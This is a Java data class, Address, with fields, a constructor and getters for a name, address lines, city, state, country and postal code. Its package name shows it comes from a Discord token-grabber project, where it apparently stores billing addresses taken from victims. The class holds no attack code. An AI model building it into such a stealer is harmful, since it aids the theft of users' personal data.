package com.github.dedinc.discordtokengrabber.objects;

public class Address {

    private String name;
    private String lineOne;
    private String lineTwo;
    private String city;
    private String state;
    private String country;
    private String postalCode;

    public Address(String name,
                   String lineOne,
                   String lineTwo,
                   String city,
                   String state,
                   String country,
                   String postalCode) {
        this.name = name;
        this.lineOne = lineOne;
        this.lineTwo = lineTwo;
        this.city = city;
        this.state = state;
        this.country = country;
        this.postalCode = postalCode;
    }

    public String getName() {
        return name;
    }

    public String getLineOne() {
        return lineOne;
    }

    public String getLineTwo() {
        return lineTwo;
    }

    public String getCity() {
        return city;
    }

    public String getState() {
        return state;
    }

    public String getCountry() {
        return country;
    }

    public String getPostalCode() {
        return postalCode;
    }
}
